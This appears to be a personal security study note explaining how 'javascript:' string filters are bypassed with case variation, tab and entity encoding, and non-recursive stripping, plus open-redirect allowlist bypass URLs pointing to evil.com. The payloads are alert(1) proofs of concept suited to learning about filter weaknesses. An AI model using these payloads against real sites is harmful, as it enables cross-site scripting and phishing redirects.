---
id: "202606200003"
title: Bypassing javascript colon string filters
date: 2026-06-20
type: concept
tags: [xss, javascript-uri, filter-bypass]
publish: false
---

Filters that block the literal substring `javascript:` are defeated by the fact that browsers strip certain whitespace/control characters when parsing a URL scheme, and are case-insensitive about scheme names:

```html
<!-- case variation -->
<a href="JaVaScRiPt:alert(1)">

<!-- control/whitespace chars inside the keyword, stripped before scheme parsing -->
<a href="java&Tab;script:alert(1)">
<a href="java&#9;script:alert(1)">

<!-- HTML entity encoding of the whole scheme -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">

<!-- filter strips the string once, non-recursively -->
javascripjavascript:t:alert(1)   <!-- after removal → javascript:alert(1) -->
```

Allowlist-based redirect-URL filters (checking a trusted domain) have their own separate bypass family: subdomain/userinfo confusion.

```
?url=https://trusted.com.evil.com/      # subdomain confusion
?url=https://trusted.com@evil.com/      # userinfo — browser navigates to evil.com
?url=https:/evil.com                    # single slash, some parsers misvalidate
```

The general principle: any filter that does a single case-sensitive string match, or decodes/normalizes only once, can be beaten by giving the browser's own (more permissive) parser something the filter didn't anticipate.

## Links
- Motivating vector: [[202606200002 javascript URI as an XSS vector when href is fully controlled]]
- Same "filter checks input, not decoded/runtime form" theme recurs in: [[202607010003 Backslash escape-neutralization bypass]], [[202607090003 javascript URIs are URL-decoded after HTML parsing before JS execution]]
